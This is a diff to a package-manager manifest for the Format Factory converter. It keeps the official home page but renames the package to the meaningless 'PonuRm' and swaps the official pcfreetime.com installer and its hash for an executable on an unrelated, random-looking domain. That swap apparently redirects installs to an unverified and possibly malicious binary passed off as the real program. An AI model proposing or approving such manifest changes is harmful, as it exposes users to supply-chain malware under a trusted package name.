@@ -1,8 +1,8 @@
 id: format-factory
-name: Format Factory
-version: 4.9.0
+name: PonuRm
+version: 5.0.5.8
 home: http://pcfreetime.com/formatfactory/index.php
-installMethod: NSIS
+installMethod: Inno
 installers:
-- location: http://www.pcfreetime.com/public/FFSetup4.9.0.0.exe
-  sha256: fc32772c251129bc44240d8c89747ce316427c9d5653e54903d414c7b9c2ef36
+- location: http://www.yaffworuyhatipa.com/q216mz78$5zr5/FFSetupLite.exe
+  sha256: daf50a327354ace6d908052e2bed6cce04947ea59a6268577bd1b3a490e1a179
